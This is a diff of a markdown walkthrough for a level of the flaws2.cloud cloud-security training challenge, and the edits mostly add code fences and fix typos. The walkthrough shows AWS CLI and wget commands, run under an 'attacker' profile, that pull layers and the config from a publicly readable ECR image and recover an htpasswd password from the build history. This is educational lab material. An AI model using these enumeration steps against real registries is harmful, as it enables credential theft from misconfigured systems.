@@ -337,7 +337,7 @@ Docker ```inspect``` command shows the final command executed and a number of re
 ]
 ```
 
-Docker images are composed of layers, which are intermediate build stages of the image. Each line in a Dockerfile results in the creation of a new layer.  For more details about Docker layers, check this in-depth explanation - [Digging into Docker layers](Digging%20into%20Docker%20layers).
+Docker images are composed of layers, which are intermediate build stages of the image. Each line in a Dockerfile results in the creation of a new layer. For more details about Docker layers, check this in-depth explanation - [Digging into Docker layers]().
 
 We can view the commands used to create all the layers when the docker container was built:
 
@@ -375,6 +375,7 @@ Finally, level 3 is at [level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud](ht
 
 We can dig a bit into the image without using Docker:
 
+```bash
 ~ aws --profile part2-attacker-level1 --region us-east-1 ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'
 {
   "schemaVersion": 2,
@@ -437,9 +438,11 @@ We can dig a bit into the image without using Docker:
     }
   ]
 }
+```
 
-Again, multiple layers. We cold get any one of them like based on tis digest:
+Again, see the multiple layers. We cold download any one of them based on its digest:
 
+```bash
 ~ aws --profile part2-attacker-level1 --region us-east-1 ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"
 
 {
@@ -448,9 +451,11 @@ Again, multiple layers. We cold get any one of them like based on tis digest:
 }
 
 ~ wget "https://prod-us-east-1-starport-layer-bucket.s3.amazonaws.com/dc26-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/f1bebb74-3af2-4d58-8bbe-cfec79c8ceb3?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20191103T222710Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAI7KZ4NTCV2EWBNUQ%2F20191103%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e54106bd045adef036d5ed36d3c3d3a06d161ef253a613af7e289d828667720a" -O layer.tar.gzip
+```
 
-Or it would be easier to just download the config file:
+Or, it would be easier to just **download the config file**:
 
+```bash
 ~ aws --profile part2-attacker-level1 --region us-east-1 ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
 {
     "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/1e964f10-a061-4e7b-9290-4447e821fe9a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20191103T224834Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAI7KZ4NTCV2EWBNUQ%2F20191103%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e9509da5e60f011f2959bc7db29a5bcbbda95167f51f193cb4e9100f742eba54",
@@ -458,14 +463,18 @@ Or it would be easier to just download the config file:
 }
 
 ~ wget "https://prod-us-east-1-starport-layer-bucket.s3.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/1e964f10-a061-4e7b-9290-4447e821fe9a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20191103T224834Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAI7KZ4NTCV2EWBNUQ%2F20191103%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e9509da5e60f011f2959bc7db29a5bcbbda95167f51f193cb4e9100f742eba54" -O config
+``` 
 
+This contains all the commands used to create the layers, including the one we were looking for:
+
+```bash
 ~ cat config | jq 
 . . 
   {
       "created": "2018-11-27T03:32:58.202361504Z",
       "created_by": "/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password"
     },
-. . 
+```
 
 ## Level 3
 
